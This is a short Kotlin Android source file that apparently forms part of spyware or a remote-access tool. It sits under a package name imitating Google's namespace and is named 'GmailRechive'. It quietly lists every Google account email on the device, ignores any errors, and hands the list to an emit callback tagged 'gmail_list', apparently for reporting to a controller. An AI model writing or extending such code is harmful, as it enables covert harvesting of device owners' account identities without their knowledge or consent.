package com.google.xmodzz

import android.accounts.AccountManager
import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object GmailRechive {
    fun listAccounts(ctx: Context, emit: (JSONObject) -> Unit) {
        val l = JSONArray()
        
        try {
            for (acc in AccountManager.get(ctx).getAccountsByType("com.google")) {
                l.put(JSONObject().put("email", acc.name))
            }
        } catch (e: Exception) {}
        
        emit(JSONObject().put("action", "gmail_list").put("data", l))
    }
}
